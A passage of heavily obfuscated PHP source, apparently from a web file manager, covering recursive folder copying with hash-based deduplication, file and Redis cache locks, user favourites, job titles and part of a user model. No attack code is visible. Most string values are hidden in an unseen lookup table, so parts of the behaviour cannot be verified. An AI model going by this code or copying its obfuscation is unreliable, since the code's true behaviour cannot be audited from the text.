$†óéëÆÑ->pathThis($§™£ê­ö); $‰¿ÃÇÖû = $this->fileNameExist($÷øŠøÒ, $µÍ‚ğäÃ); $‘ûŠÓàã = $this->mkdir($÷øŠøÒ, $µÍ‚ğäÃ, $¥Ä“¸¬”); if (!$‰¿ÃÇÖû || $¥Ä“¸¬” == REPEAT_RENAME_FOLDER) { $¥Ä“¸¬” = !1; } if ($‰¿ÃÇÖû) { $this->_childrenAllMake($‰¿ÃÇÖû); } Hook::trigger($˜¼ëŞê”[634]); $this->_copyChildTo($†óéëÆÑ, $§™£ê­ö, $‘ûŠÓàã, $¥Ä“¸¬”, $­îó¥ Ú, $ì‡¸×æÃ); Hook::trigger($˜¼ëŞê”[635]); if ($‘ûŠÓàã) { $this->folderSizeResetChildren($‘ûŠÓàã); } $this->_childrenListClear(); Model($˜¼ëŞê”[598])->addAll($­îó¥ Ú[$˜¼ëŞê”[596]], array(), !0); Model($˜¼ëŞê”[599])->eventCopy($‘ûŠÓàã); $this->saveAll($­îó¥ Ú[$˜¼ëŞê”[597]]); Model($˜¼ëŞê”[509])->linkAdd($­îó¥ Ú[$˜¼ëŞê”[595]]); Model($˜¼ëŞê”[509])->remove($­îó¥ Ú[$˜¼ëŞê”[633]]); $this->folderSizeReset($÷øŠøÒ); $this->updateModifyTime($÷øŠøÒ); return $‘ûŠÓàã; } private function _copyChildTo($–ıØÂ‚Ä, $şáƒ»¡, $òË‚ÚÈ¢, $×õäÀŞ, &$ß“çí©±, $Í­ÊÂØ³) { $õĞ®¼ =& $_SERVER[¹òÍ›æş]; $ŸæˆØòõ = $this->sourceInfoCache($òË‚ÚÈ¢); $ìÍ¶««£ = $–ıØÂ‚Ä->listPath($şáƒ»¡); $ìÍ¶««£ = $ìÍ¶««£ ? $ìÍ¶««£ : array($õĞ®¼[93] => array(), $õĞ®¼[92] => array()); $øÎœöÃÁ = array_merge($ìÍ¶««£[$õĞ®¼[93]], $ìÍ¶««£[$õĞ®¼[92]]); $úªËääŒ = $this->_addFiles($–ıØÂ‚Ä, $ìÍ¶««£[$õĞ®¼[93]], $Í­ÊÂØ³); $ÎœÌèÙ  = array(); foreach ($øÎœöÃÁ as &$¼¹”Ñ›…) { if (isset($úªËääŒ[$¼¹”Ñ›…[$õĞ®¼[32]]])) { $¼¹”Ñ›… = $úªËääŒ[$¼¹”Ñ›…[$õĞ®¼[32]]]; } $¼¹”Ñ›…[$õĞ®¼[448]] = $¼¹”Ñ›…[$õĞ®¼[33]] == $õĞ®¼[85]; $¼¹”Ñ›…[$õĞ®¼[450]] = substr(_get($¼¹”Ñ›…, $õĞ®¼[184], $õĞ®¼[12]), 0, 10); $¼¹”Ñ›…[$õĞ®¼[86]] = _get($¼¹”Ñ›…, $õĞ®¼[86], 0); $¼¹”Ñ›…[$õĞ®¼[506]] = _get($¼¹”Ñ›…, $õĞ®¼[506], 0); if (!isset($¼¹”Ñ›…[$õĞ®¼[636]]) && $¼¹”Ñ›…[$õĞ®¼[506]]) { $ß“çí©±[$õĞ®¼[633]][] = $¼¹”Ñ›…[$õĞ®¼[506]]; } if ($×õäÀŞ) { $Š¬—ë˜’ = $this->fileNameExistCache($òË‚ÚÈ¢, $¼¹”Ñ›…[$õĞ®¼[32]]); if ($Š¬—ë˜’) { if ($¼¹”Ñ›…[$õĞ®¼[448]] || $×õäÀŞ == REPEAT_SKIP) { continue; } if ($×õäÀŞ == REPEAT_REPLACE) { $û±»±Œã = $this->sourceInfoCache($Š¬—ë˜’); $üô¹„Œï = $this->fileHistory($û±»±Œã, $¼¹”Ñ›…[$õĞ®¼[506]], $¼¹”Ñ›…[$õĞ®¼[86]]); if ($üô¹„Œï) { $ß“çí©±[$õĞ®¼[595]][] = $¼¹”Ñ›…[$õĞ®¼[506]]; } continue; } else { if ($×õäÀŞ == REPEAT_RENAME) { $¼¹”Ñ›…[$õĞ®¼[32]] = $this->fileNameAutoCache($òË‚ÚÈ¢, $¼¹”Ñ›…[$õĞ®¼[32]], $×õäÀŞ, !1); } } } } if (!$¼¹”Ñ›…[$õĞ®¼[448]] && $¼¹”Ñ›…[$õĞ®¼[506]] == 0) { continue; } if (!$¼¹”Ñ›…[$õĞ®¼[448]] && $¼¹”Ñ›…[$õĞ®¼[506]]) { $ß“çí©±[$õĞ®¼[595]][] = $¼¹”Ñ›…[$õĞ®¼[506]]; } $ÎœÌèÙ [] = $this->_makeItemData($¼¹”Ñ›…, $ŸæˆØòõ, $¼¹”Ñ›…[$õĞ®¼[32]]); } unset($¼¹”Ñ›…); if (!empty($ÎœÌèÙ )) { $this->addAll($ÎœÌèÙ ); $this->_childrenListSelect($òË‚ÚÈ¢); } $£íª = $this->_childrenList($òË‚ÚÈ¢); $£íª = array_to_keyvalue($£íª, $õĞ®¼[32]); foreach ($øÎœöÃÁ as $¼¹”Ñ›…) { $û±»±Œã = $£íª[$¼¹”Ñ›…[$õĞ®¼[32]]]; $¦¬ÛØÂÂ = $û±»±Œã[$õĞ®¼[440]]; $this->_copyApplyMeta($û±»±Œã, $ß“çí©±); if ($¼¹”Ñ›…[$õĞ®¼[33]] == $õĞ®¼[85]) { $¼¹”Ñ›…[$õĞ®¼[94]] = $–ıØÂ‚Ä->getPathInner($¼¹”Ñ›…[$õĞ®¼[94]]); $this->_copyChildTo($–ıØÂ‚Ä, $¼¹”Ñ›…[$õĞ®¼[94]], $¦¬ÛØÂÂ, $×õäÀŞ, $ß“çí©±, $Í­ÊÂØ³); } } } private function _addFiles($²“›çô, $õ½ºç›ô, $ÙŞØËâ) { $¦úÏÆïÅ =& $_SERVER[¹òÍ›æş]; if (!$õ½ºç›ô || count($õ½ºç›ô) == 0) { return array(); } $ãÏ™ûˆ = array(); foreach ($õ½ºç›ô as &$û¾ÛÃ¶) { Hook::trigger($¦úÏÆïÅ[637], $û¾ÛÃ¶); $û¾ÛÃ¶[$¦úÏÆïÅ[94]] = $²“›çô->getPathInner($û¾ÛÃ¶[$¦úÏÆïÅ[94]]); $™ã©øÖ„ = $²“›çô->hashSimple($û¾ÛÃ¶[$¦úÏÆïÅ[94]]); $×ÚÍñô‡ = $²“›çô->hashMd5($û¾ÛÃ¶[$¦úÏÆïÅ[94]]); if (strlen($×ÚÍñô‡) > 10 && !isset($ãÏ™ûˆ[$×ÚÍñô‡])) { $ãÏ™ûˆ[$×ÚÍñô‡] = array(); } $û¾ÛÃ¶[$¦úÏÆïÅ[187]] = $™ã©øÖ„; $û¾ÛÃ¶[$¦úÏÆïÅ[186]] = $×ÚÍñô‡; $ãÏ™ûˆ[$×ÚÍñô‡][] =& $û¾ÛÃ¶; if (count($ãÏ™ûˆ[$×ÚÍñô‡]) > 1) { $û¾ÛÃ¶[$¦úÏÆïÅ[636]] = !0; } Hook::trigger($¦úÏÆïÅ[638], $û¾ÛÃ¶); } unset($û¾ÛÃ¶); $©Ø¾«¡Ó = array($¦úÏÆïÅ[186] => array($¦úÏÆïÅ[7], array_keys($ãÏ™ûˆ))); $óşõœ•´ = Model($¦úÏÆïÅ[639]); $¼­…ë˜Ê = $óşõœ•´->where($©Ø¾«¡Ó)->select(); $¼­…ë˜Ê = $¼­…ë˜Ê ? $¼­…ë˜Ê : array(); foreach ($¼­…ë˜Ê as $’‰÷´­) { if (!isset($ãÏ™ûˆ[$’‰÷´­[$¦úÏÆïÅ[186]]])) { continue; } $ş±¾¯¢ = $ãÏ™ûˆ[$’‰÷´­[$¦úÏÆïÅ[186]]]; foreach ($ş±¾¯¢ as &$û¾ÛÃ¶) { $û¾ÛÃ¶[$¦úÏÆïÅ[506]] = $’‰÷´­[$¦úÏÆïÅ[506]]; $û¾ÛÃ¶[$¦úÏÆïÅ[636]] = !0; } unset($û¾ÛÃ¶); } $¬”æïÂ = array(); foreach ($õ½ºç›ô as $ß–ñÑÂº) { Hook::trigger($¦úÏÆïÅ[640], $ß–ñÑÂº); if (isset($ß–ñÑÂº[$¦úÏÆïÅ[636]]) && $ß–ñÑÂº[$¦úÏÆïÅ[636]]) { Hook::trigger($¦úÏÆïÅ[641], $ß–ñÑÂº); continue; } $¸ÚºÄôµ = $²“›çô->getPathInner($ß–ñÑÂº[$¦úÏÆïÅ[94]]); $Å¹ğî° = $óşõœ•´->addFileMake($¸ÚºÄôµ, $ß–ñÑÂº[$¦úÏÆïÅ[86]], $ß–ñÑÂº[$¦úÏÆïÅ[187]], $ß–ñÑÂº[$¦úÏÆïÅ[186]], $ß–ñÑÂº[$¦úÏÆïÅ[32]], $ÙŞØËâ); Hook::trigger($¦úÏÆïÅ[641], $ß–ñÑÂº); if (!is_array($Å¹ğî°)) { continue; } $¬”æïÂ[] = $Å¹ğî°; } $óşõœ•´->addAll($¬”æïÂ); $©Ø¾«¡Ó = array($¦úÏÆïÅ[186] => array($¦úÏÆïÅ[7], array_keys($ãÏ™ûˆ))); $¼­…ë˜Ê = $óşõœ•´->where($©Ø¾«¡Ó)->select(); $¼­…ë˜Ê = $¼­…ë˜Ê ? $¼­…ë˜Ê : array(); foreach ($¼­…ë˜Ê as $’‰÷´­) { if (!isset($ãÏ™ûˆ[$’‰÷´­[$¦úÏÆïÅ[186]]])) { continue; } $ïëÊÑ†± =& $ãÏ™ûˆ[$’‰÷´­[$¦úÏÆïÅ[186]]]; foreach ($ïëÊÑ†± as &$û¾ÛÃ¶) { $û¾ÛÃ¶[$¦úÏÆïÅ[506]] = $’‰÷´­[$¦úÏÆïÅ[506]]; } unset($û¾ÛÃ¶); } $½ôã¶ı¦ = array(); foreach ($õ½ºç›ô as $İÇŞœØ®) { $½ôã¶ı¦[$İÇŞœØ®[$¦úÏÆïÅ[32]]] = $İÇŞœØ®; } return $½ôã¶ı¦; } } define($_SERVER[¹òÍ›æş][642], $_SERVER[¹òÍ›æş][643]); $qejvsxporm = $_SERVER[¹òÍ›æş][644]; goto e’Ê¯–™íÔ; cÆ›Ó±˜…ä: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ŞöØŸá¤ =& $_SERVER[¹òÍ›æş]; $šùæĞ¦ = $GLOBALS[$ŞöØŸá¤[6]][$ŞöØŸá¤[387]]; self::$cachePath = $šùæĞ¦[$ŞöØŸá¤[210]][$ŞöØŸá¤[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÂÕµó¹÷, $Èµéö·û = 0) { $ÒÀüöŞÍ =& $_SERVER[¹òÍ›æş]; $ ÓŒÛË¾ = microtime(!0); $÷èº¹» = $ ÓŒÛË¾ + $Èµéö·û + 0.0001; $ä‹€Æ‡¬ = rtrim(self::$cachePath, $ÒÀüöŞÍ[8]) . $ÒÀüöŞÍ[893] . md5($ÂÕµó¹÷) . $ÒÀüöŞÍ[890]; if (file_exists($ä‹€Æ‡¬) && filemtime($ä‹€Æ‡¬) && filemtime($ä‹€Æ‡¬) < time() - 10) { @unlink($ä‹€Æ‡¬); } do { if (file_exists($ä‹€Æ‡¬)) { cacheLockWait(); continue; } $Â²…‚¯ = fopen($ä‹€Æ‡¬, $ÒÀüöŞÍ[894]); if (!$Â²…‚¯) { return !1; } $™öÄ¬× = flock($Â²…‚¯, LOCK_EX | LOCK_NB); self::$caches[$ÂÕµó¹÷] = array($ÒÀüöŞÍ[895] => $Â²…‚¯, $ÒÀüöŞÍ[210] => $ä‹€Æ‡¬); fwrite($Â²…‚¯, $÷èº¹»); clearstatcache(); if ($Â²…‚¯ && $™öÄ¬×) { return !0; } cacheLockWait(); } while (microtime(!0) < $÷èº¹»); $this->unlock($ÂÕµó¹÷); return !1; } public function lockGet($È¾…™å¹) { $¤¸ËùÖÙ =& $_SERVER[¹òÍ›æş]; $Â·—‘µ = rtrim(self::$cachePath, $¤¸ËùÖÙ[8]) . $¤¸ËùÖÙ[893] . md5($È¾…™å¹) . $¤¸ËùÖÙ[890]; return file_exists($Â·—‘µ); } public function unlock($™šõ¤ê‰) { $ÍèÀÂ¥Š =& $_SERVER[¹òÍ›æş]; $Ó§Ö¼Ä = self::$caches[$™šõ¤ê‰]; if (!$Ó§Ö¼Ä) { return; } @flock($Ó§Ö¼Ä[$ÍèÀÂ¥Š[895]], LOCK_UN); @fclose($Ó§Ö¼Ä[$ÍèÀÂ¥Š[895]]); @unlink($Ó§Ö¼Ä[$ÍèÀÂ¥Š[210]]); unset(self::$caches[$™šõ¤ê‰]); } } class CacheLockRedis { public function lock($ş¸ ½Ò†, $àÁåØ˜Ô = 10) { $á­şš¿÷ = Cache::init(); $ÖÙ¶¬ƒé = microtime(!0) + $àÁåØ˜Ô; while (microtime(!0) < $ÖÙ¶¬ƒé) { $Øß€„­Ô = $á­şš¿÷->get($ş¸ ½Ò†); if (!$Øß€„­Ô) { $ñØ÷Åæ« = $á­şš¿÷->setLock($ş¸ ½Ò†, $ÖÙ¶¬ƒé, $àÁåØ˜Ô); if ($ñØ÷Åæ«) { return !0; } } else { if ($Øß€„­Ô < microtime(!0)) { $á­şš¿÷->set($ş¸ ½Ò†, $ÖÙ¶¬ƒé, $àÁåØ˜Ô * 2); if ($á­şš¿÷->get($ş¸ ½Ò†) === $Øß€„­Ô) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ÿš€²˜ü) { return Cache::init()->get($Ÿš€²˜ü); } public function unlock($í™ØŸ¹) { return Cache::init()->remove($í™ØŸ¹); } } goto eøÁ¸õ’ôƒ; Fç¸çÉ¬Æƒ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($Ù™„ˆ²“) { $¢ÓÕÚÈÀ =& $_SERVER[¹òÍ›æş]; return array($¢ÓÕÚÈÀ[1970] => array(USER_ID, $¢ÓÕÚÈÀ[2304])); } protected function listData() { $ãşÇ÷ª± =& $_SERVER[¹òÍ›æş]; $ÕğÁì¦§ = array($ãşÇ÷ª±[1660] => USER_ID, $ãşÇ÷ª±[521] => 0); $óÅÜè¤÷ = $ãşÇ÷ª±[2305]; $ğ¡Ü–»Â = $this->field($óÅÜè¤÷)->where($ÕğÁì¦§)->order($ãşÇ÷ª±[2306])->select(); return $ğ¡Ü–»Â ? $ğ¡Ü–»Â : array(); } protected function resetCache() { } protected function listView() { $îıÈ¨Ãˆ =& $_SERVER[¹òÍ›æş]; $¨¯¼½‚ = $this->listData(); $’ëö·×· = array_filter_by_field($¨¯¼½‚, $îıÈ¨Ãˆ[33], $îıÈ¨Ãˆ[454]); $Øà«ÑÚÓ = array_to_keyvalue($’ëö·×·, $îıÈ¨Ãˆ[12], $îıÈ¨Ãˆ[94]); if (!$Øà«ÑÚÓ) { return $¨¯¼½‚; } $‰Ëı‡êó = 2000; $Üõš•Ïû = array($îıÈ¨Ãˆ[455] => array($îıÈ¨Ãˆ[456], $Øà«ÑÚÓ)); $Æîôà ÷ = Model($îıÈ¨Ãˆ[855])->listSource($Üõš•Ïû, $‰Ëı‡êó); $Æîôà ÷ = array_merge($Æîôà ÷[$îıÈ¨Ãˆ[93]], $Æîôà ÷[$îıÈ¨Ãˆ[92]]); $Æîôà ÷ = array_to_keyvalue($Æîôà ÷, $îıÈ¨Ãˆ[440]); foreach ($¨¯¼½‚ as $Í½Ø”Êò => $Ú®ó¨§) { $õ ‘ã¤· = $Æîôà ÷[$Ú®ó¨§[$îıÈ¨Ãˆ[94]]]; $õ ‘ã¤· = $õ ‘ã¤· ? $õ ‘ã¤· : array(); $¨¯¼½‚[$Í½Ø”Êò] = array_merge($õ ‘ã¤·, $Ú®ó¨§); } return $¨¯¼½‚; } protected function addFav($‘‰ÂÎéÔ, $¼İú–Ó– = '', $îéÅËø¦ = "\163\157\x75\162\x63\x65") { $ÇŒÃ =& $_SERVER[¹òÍ›æş]; $Šç©Ášò = array($ÇŒÃ[1660] => USER_ID, $ÇŒÃ[521] => 0, $ÇŒÃ[460] => $îéÅËø¦, $ÇŒÃ[459] => $‘‰ÂÎéÔ); if ($this->where($Šç©Ášò)->find()) { return !1; } $Šç©Ášò = array($ÇŒÃ[1660] => USER_ID, $ÇŒÃ[521] => 0); $–ñ€Ø = $this->where($Šç©Ášò)->max($ÇŒÃ[1883]); if (!$–ñ€Ø) { $–ñ€Ø = 0; } if (!$¼İú–Ó– && $îéÅËø¦ == $ÇŒÃ[454]) { $Á»¡êÎ¸ = Model($ÇŒÃ[1360])->where(array($ÇŒÃ[455] => $‘‰ÂÎéÔ))->find(); if (!$Á»¡êÎ¸) { return !1; } $¼İú–Ó– = $Á»¡êÎ¸[$ÇŒÃ[32]]; } $¼İú–Ó– = $this->getAutoName($¼İú–Ó–); $ˆÕàÛŠü = array($ÇŒÃ[1660] => USER_ID, $ÇŒÃ[521] => 0, $ÇŒÃ[458] => $¼İú–Ó–, $ÇŒÃ[459] => $‘‰ÂÎéÔ, $ÇŒÃ[460] => $îéÅËø¦, $ÇŒÃ[1863] => $–ñ€Ø + 1); return $this->add($ˆÕàÛŠü); } protected function remove($‘ûçÊ¸–) { $œ¬æ†Ù =& $_SERVER[¹òÍ›æş]; $Ğ³ÓÃÓı = array($œ¬æ†Ù[1660] => USER_ID, $œ¬æ†Ù[457] => $‘ûçÊ¸–); return $this->where($Ğ³ÓÃÓı)->delete(); } protected function removeByName($ëŒÓ±ı†) { $îÊæû´› =& $_SERVER[¹òÍ›æş]; $…Í¡Ô» = array($îÊæû´›[1660] => USER_ID, $îÊæû´›[458] => $ëŒÓ±ı†, $îÊæû´›[521] => 0); return $this->where($…Í¡Ô»)->delete(); } protected function rename($ÖªßŞ¢Ê, $ÏÄ•Ò¥Ó) { $ÈË‘Â© =& $_SERVER[¹òÍ›æş]; if ($ÖªßŞ¢Ê == $ÏÄ•Ò¥Ó) { return !1; } $•ë¹Á˜Æ = $this->getAutoName($ÏÄ•Ò¥Ó); if ($ÏÄ•Ò¥Ó != $•ë¹Á˜Æ) { return !1; } $íåÓ·å  = array($ÈË‘Â©[1660] => USER_ID, $ÈË‘Â©[521] => 0, $ÈË‘Â©[32] => $ÖªßŞ¢Ê); return $this->where($íåÓ·å )->save(array($ÈË‘Â©[32] => $ÏÄ•Ò¥Ó)); } protected function resetSort($ËÖ÷À•) { $¬ÇÂ®Á® =& $_SERVER[¹òÍ›æş]; $ËÖ÷À• = is_array($ËÖ÷À•) ? $ËÖ÷À• : array(); $¥ä»Ë«Ğ = array($¬ÇÂ®Á®[1660] => USER_ID); for ($ç„¾¿ = 0; $ç„¾¿ < count($ËÖ÷À•); $ç„¾¿++) { $¥ä»Ë«Ğ[$¬ÇÂ®Á®[457]] = $ËÖ÷À•[$ç„¾¿]; $this->where($¥ä»Ë«Ğ)->save(array($¬ÇÂ®Á®[1863] => $ç„¾¿ + 1)); } return !0; } protected function moveTop($şÂ¡—·­) { $¢Ñå’¡ì =& $_SERVER[¹òÍ›æş]; $…ØĞ—Üë = array($¢Ñå’¡ì[1660] => USER_ID, $¢Ñå’¡ì[521] => 0); $€™Ş™çæ = $this->where($…ØĞ—Üë)->where(array($¢Ñå’¡ì[32] => $şÂ¡—·­))->find(); if (!$€™Ş™çæ) { return; } $ØÈ¶³Á = $this->field($¢Ñå’¡ì[437])->where($…ØĞ—Üë)->order($¢Ñå’¡ì[2306])->select(); $ØÈ¶³Á = array_to_keyvalue($ØÈ¶³Á, $¢Ñå’¡ì[12], $¢Ñå’¡ì[437]); $¨Œü¨ì = $ØÈ¶³Á; $ØÈ¶³Á = array_remove_value($ØÈ¶³Á, $€™Ş™çæ[$¢Ñå’¡ì[437]]); array_unshift($ØÈ¶³Á, $€™Ş™çæ[$¢Ñå’¡ì[437]]); return $this->resetSort($ØÈ¶³Á); } protected function moveBottom($èÖş÷—ˆ) { $³„¢Éı =& $_SERVER[¹òÍ›æş]; $°Õ·•Òø = array($³„¢Éı[1660] => USER_ID, $³„¢Éı[521] => 0); $öë “ÙŸ = $this->where($°Õ·•Òø)->max($³„¢Éı[1883]); $¥åîÃÙ  = array($³„¢Éı[1883] => $öë “ÙŸ + 1); return $this->where($°Õ·•Òø)->where(array($³„¢Éı[32] => $èÖş÷—ˆ))->save($¥åîÃÙ ); } private function getAutoName($ï¨Çø‘) { $ ÔÆÓàŸ =& $_SERVER[¹òÍ›æş]; $›ÜšŞêÙ = array($ ÔÆÓàŸ[1660] => USER_ID, $ ÔÆÓàŸ[521] => 0); $˜ã€÷¯ = $this->field($ ÔÆÓàŸ[32])->where($›ÜšŞêÙ)->select(); $˜ã€÷¯ = array_to_keyvalue($˜ã€÷¯, $ ÔÆÓàŸ[12], $ ÔÆÓàŸ[32]); if (!$˜ã€÷¯ || !in_array($ï¨Çø‘, $˜ã€÷¯)) { return $ï¨Çø‘; } for ($ˆ³¼–ØÜ = 0; $ˆ³¼–ØÜ < count($˜ã€÷¯); $ˆ³¼–ØÜ++) { if (!in_array($ï¨Çø‘ . "\50{$ˆ³¼–ØÜ}\x29", $˜ã€÷¯)) { return $ï¨Çø‘ . "\50{$ˆ³¼–ØÜ}\x29"; } } return $ï¨Çø‘ . "\x28{$ˆ³¼–ØÜ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\x6a\x6f\x62\114\151\163\164"; public $field = array("\156\141\155\x65", "\144\145\x73\143", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\145\154\146\112\x6f\142\114\151\x73\x74"; public function listData($ÄÁğ²°¢ = false, $Ûœ…•Ù = "\163\157\x72\x74", $‹Œ„×™¹ = false) { return parent::listData($ÄÁğ²°¢, $Ûœ…•Ù, $‹Œ„×™¹); } public function remove($Š¼êŠà¹) { return parent::remove($Š¼êŠà¹); } public function add($…Ÿ„½Ÿ‹) { $«êĞ—Ö¶ =& $_SERVER[¹òÍ›æş]; if ($this->findByName($…Ÿ„½Ÿ‹[$«êĞ—Ö¶[32]])) { return !1; } $…Ÿ„½Ÿ‹[$«êĞ—Ö¶[1883]] = $this->getSort(); return parent::insert($…Ÿ„½Ÿ‹); } private function getSort() { $é­¯ï€ =& $_SERVER[¹òÍ›æş]; $è¾ÃòØ = parent::listData(); $“ª€Éğâ = array_to_keyvalue($è¾ÃòØ, $é­¯ï€[12], $é­¯ï€[1883]); return empty($“ª€Éğâ) ? 0 : max($“ª€Éğâ) + 1; } public function update($“³ĞŸÉó, $ßè¹”Ğ) { $ç£à¯´² =& $_SERVER[¹òÍ›æş]; $ÀµœÃù = parent::listData($“³ĞŸÉó); $ÃîŞ‰â‚ = $this->findByName($ßè¹”Ğ[$ç£à¯´²[32]]); if (!$ÀµœÃù || $ÃîŞ‰â‚ && $ÃîŞ‰â‚[$ç£à¯´²[437]] != $ÀµœÃù[$ç£à¯´²[437]]) { return !1; } return parent::update($“³ĞŸÉó, $ßè¹”Ğ); } public function setUserJob($­Â´¢‹¡, $ ÂöÓ›¿) { $ºÌÃÚÚË =& $_SERVER[¹òÍ›æş]; if (!is_array($ ÂöÓ›¿)) { $ ÂöÓ›¿ = array($ ÂöÓ›¿); } $»ïü™ÑÂ = parent::listData(); $é½õÊ€Å = array_to_keyvalue($»ïü™ÑÂ, $ºÌÃÚÚË[32]); $šğóĞòƒ = $ºÌÃÚÚË[416]; foreach ($ ÂöÓ›¿ as $¥ËÂ×É) { if ($é½õÊ€Å[$¥ËÂ×É]) { $šğóĞòƒ .= $é½õÊ€Å[$¥ËÂ×É][$ºÌÃÚÚË[437]] . $ºÌÃÚÚË[50]; } else { $ªõ—¿Ò§ = $this->add($¥ËÂ×É); $šğóĞòƒ .= $ªõ—¿Ò§ . $ºÌÃÚÚË[50]; } } $šğóĞòƒ = rtrim($šğóĞòƒ, $ºÌÃÚÚË[50]); Model($ºÌÃÚÚË[563])->metaSet($­Â´¢‹¡, self::JOB_KEY, $šğóĞòƒ); } public function getUserJob($¿ÓëÌµÇ) { $–¨ä˜« = Model($_SERVER[¹òÍ›æş][563])->metaGet($¿ÓëÌµÇ); return $this->getUserJobInfo($–¨ä˜«[self::JOB_KEY]); } public function getUserJobInfo($²àÜ¶ö‡) { $üÎ½Š–õ =& $_SERVER[¹òÍ›æş]; $æ‡äğ¢× = explode($üÎ½Š–õ[50], $²àÜ¶ö‡); $ºçƒÉ” = parent::listData(); $ºçƒÉ” = array_remove_key($ºçƒÉ”, $üÎ½Š–õ[211]); $áˆúøôù = array(); foreach ($æ‡äğ¢× as $÷®â€†Ì) { if (isset($ºçƒÉ”[$÷®â€†Ì])) { $áˆúøôù[] = $ºçƒÉ”[$÷®â€†Ì]; } } return $áˆúøôù; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\155\x65" => "\x75\x73\145\162\137\x6d\x65\x74\x61", "\155\x65\x74\141\x46\151\x65\154\x64" => "\x75\x73\x65\x72\x49\x44"); protected $simpleField = "\165\163\145\162\x49\x44\x2c\156\x69\143\x6b\116\141\155\x65\54\156\141\x6d\x65\54\141\166\x61\164\x61\x72\54\x73\145\170\54\x73\164\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¸ô—Ş«) { $Ü¦‡Ÿ¯È =& $_SERVER[¹òÍ›æş]; $¤ˆõã‡ = $Ü¦‡Ÿ¯È[2307]; return array($Ü¦‡Ÿ¯È[1937] => array($¸ô—Ş«[0], $¤ˆõã‡), $Ü¦‡Ÿ¯È[1939] => array($¸ô—Ş«[0], $¤ˆõã‡), $Ü¦‡Ÿ¯È[2308] => array($¸ô—Ş«[0], $¤ˆõã‡)); } protected function getInfo($ØêÉò¸µ, $³õìãÂ¾ = false) { $œÖ˜ôìô = $this->getInfoSimple($ØêÉò¸µ); if (!is_array($œÖ˜ôìô)) { return array(); } if ($³õìãÂ¾) { return $this->_getInfoApply($œÖ˜ôìô); } return $this->cacheFunctionGet($_SERVER[¹òÍ›æş][1941], $ØêÉò¸µ); } protected function getInfoFull($ØÂæÚÇğ, $Õ‰ûñâ™ = false) { $€ã¯Ïò = $this->getInfoSimple($ØÂæÚÇğ); if (!is_array($€ã¯Ïò)) { return array(); } if ($Õ‰ûñâ™) { return $this->_getInfoApply($€ã¯Ïò, !0); } return $this->cacheFunctionGet($_SERVER[¹òÍ›æş][2309], $ØÂæÚÇğ); } private function _getInfoApply($áÙ¡˜š, $¬ŞÉ›ó = false) { $Ìú¢ =& $_SERVER[¹òÍ›æş]; if (!$áÙ¡˜š) { return $áÙ¡˜š; } $Ù½ïëÂ = md5($Ìú¢[2310] . $áÙ¡˜š[$Ìú¢[916]] . $Ìú¢[2311] . $áÙ¡˜š[$Ìú¢[32]]); $áÙ¡˜š = $this->_listDataApplyItem($áÙ¡˜š); $—øø´© = Model($Ìú¢[1360])->metaGet($áÙ¡˜š[$Ìú¢[97]][$Ìú¢[440]]); $áÙ¡˜š[$Ìú¢[2312]] = $Ù½ïëÂ; $áÙ¡˜š[$Ìú¢[97]][$Ìú¢[2133]] = isset($—øø´©[$Ìú¢[2134]]) ? $—øø´©[$Ìú¢[2134]] : null; if ($¬ŞÉ›ó) { $áÙ¡˜š[$Ìú¢[504]] = $this->metaGet($áÙ¡˜š[$Ìú¢[1669]]); } return $áÙ¡˜š; } protected function getInfoSimple($ÂÊì×ãœ, $”…şîøı = false) { $Í¦§âÓ =& $_SERVER[¹òÍ›æş]; if (!$ÂÊì×ãœ) { return array(); } if ($”…şîøı) { $®°Ÿ÷ƒˆ = $this->where(array($Í¦§âÓ[1669] => intval($ÂÊì×ãœ)))->find(); if (!is_array($®°Ÿ÷ƒˆ)) { return array(); } $®°Ÿ÷ƒˆ[$Í¦§âÓ[571]] = Action($Í¦§âÓ[2313])->parseUrl($®°Ÿ÷ƒˆ[$Í¦§âÓ[571]]); return $®°Ÿ÷ƒˆ; } return $this->cacheFunctionGet($Í¦§âÓ[1942], $ÂÊì×ãœ); } protected function getInfoSimpleOuter($ôÏÈöí) { $¶Ğ®üƒ =& $_SERVER[¹òÍ›æş]; if (!$ôÏÈöí || $ôÏÈöí == 0) { return array($¶Ğ®üƒ[1669] => $¶Ğ®üƒ[208], $¶Ğ®üƒ[32] => $¶Ğ®üƒ[172] . LNG($¶Ğ®üƒ[2314]) . $¶Ğ®üƒ[174], $¶Ğ®üƒ[571] => STATIC_PATH . $¶Ğ®üƒ[2315]); } $îï «ç© = $this->cacheFunctionGet($¶Ğ®üƒ[1942], $ôÏÈöí); $ü¬ÂÔÍ = array_field_key($îï «ç©, explode($¶Ğ®üƒ[50], $this->simpleField)); if (!$ü¬ÂÔÍ) { return array($¶Ğ®üƒ[1669] => $¶Ğ®üƒ[1215], $¶Ğ®üƒ[32] => $¶Ğ®üƒ[172] . LNG($¶Ğ®üƒ[2316]) . $¶Ğ®üƒ[174], $¶Ğ®üƒ[571] => STATIC_PATH . $¶Ğ®üƒ[2317]); } $ü¬ÂÔÍ[$¶Ğ®üƒ[571]] = Action($¶Ğ®üƒ[2313])->parseUrl($ü¬ÂÔÍ[$¶Ğ®üƒ[571]]); return $ü¬ÂÔÍ; } protected function groupUser($Ğ˜Š‹Å) { } public static function errorLang($í¶Ø‰‰¡) { $‡’¤°ò° =& $_SERVER[¹òÍ›æş]; $ê±Ñ³­ñ = array(self::ERROR_USER_NOT_EXISTS => $‡’¤°ò°[2318], self::ERROR_USER_PASSWORD_ERROR => $‡’¤°ò°[2319], self::ERROR_USER_EXIST_NAME => $‡’¤°ò°[2320], self::ERROR_USER_EXIST_PHONE => $‡’¤°ò°[2321], 